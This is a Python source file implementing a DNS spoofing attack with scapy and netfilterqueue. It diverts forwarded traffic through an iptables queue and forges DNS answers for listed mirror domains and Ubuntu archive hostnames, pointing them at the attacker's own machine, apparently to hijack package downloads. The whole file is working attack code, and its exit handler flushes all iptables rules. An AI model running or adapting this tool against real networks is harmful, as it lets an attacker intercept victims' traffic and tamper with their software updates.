from scapy.all import IP, DNS, DNSRR, DNSQR, UDP, get_if_addr
from netfilterqueue import NetfilterQueue
import os

def dns_spoof(interface, mirrors):
    global iface
    iface = interface
    global mirror_list
    mirror_list = mirrors

    QUEUE_NUM = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

    nfqueue = NetfilterQueue()

    try:
        print("Started DNS spoofing")

        nfqueue.bind(QUEUE_NUM, process_packet)
        nfqueue.run()
    except KeyboardInterrupt:
        print("Stopped DNS spoofing")
        os.system("iptables --flush")

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if (scapy_packet.haslayer(DNSRR)):
        print("DNS request for IP: " + str(scapy_packet.summary()))
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        packet.set_payload(bytes(scapy_packet))

    packet.accept()

def modify_packet(packet):
    qname = packet[DNSQR].qname
    qname_dec = qname.decode('utf-8')
    qnames = [link + "." for link in mirror_list]
    if qname_dec in qnames or ("ubuntu" in qname_dec and "archive" in qname_dec):
        packet[DNS].an = DNSRR(rrname=qname, rdata=get_if_addr(iface))

        packet[DNS].ancount = 1

        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum

        print("Modified request for IP: " + str(packet.summary()))

    return packet
